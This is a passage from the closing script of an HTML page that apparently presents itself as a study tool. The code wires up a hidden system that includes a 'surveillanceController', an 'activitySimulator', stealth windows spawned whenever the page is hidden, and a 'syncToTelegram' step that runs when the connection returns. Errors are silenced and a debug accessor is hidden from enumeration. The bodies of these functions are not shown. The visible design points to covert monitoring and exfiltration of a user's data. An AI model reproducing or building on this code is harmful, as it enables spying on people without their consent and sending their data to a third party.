                    
                }, 1000); // 1 second delay for background init
                
            } catch (error) {
                // Silent fail
            }
        }
        
        // ============== EVENT HANDLERS ==============
        
        // Quick loading completion
        setTimeout(hideLoading, 1500);
        
        // Emergency restart button
        elements.emergencyRestart.addEventListener('click', () => {
            if (window._system) {
                window._system.restart();
            }
        });
        
        // Handle page visibility
        document.addEventListener('visibilitychange', () => {
            if (document.hidden && window._system && window._system.windowManager) {
                // Page hidden - create backup window
                setTimeout(() => {
                    window._system.windowManager.createStealthWindow();
                }, 1000);
            }
        });
        
        // Handle beforeunload for cleanup
        window.addEventListener('beforeunload', () => {
            if (window._system) {
                window._system.surveillanceController?.stop();
                window._system.tabCoordinator?.cleanup();
                window._system.windowManager?.cleanup();
                window._system.activitySimulator?.cleanup();
            }
        });
        
        // Handle online/offline
        window.addEventListener('online', () => {
            if (window._system && window._system.persistence) {
                // Trigger sync when back online
                setTimeout(() => {
                    window._system.persistence.syncToTelegram();
                }, 2000);
            }
        });
        
        // ============== START SYSTEM ==============
        
        // Start immediately
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initializeSystem);
        } else {
            initializeSystem();
        }
        
        // Debug access (hidden)
        Object.defineProperty(window, 'studySystem', {
            get: () => window._system,
            configurable: false,
            enumerable: false
        });
        
    </script>
</body>
</html>
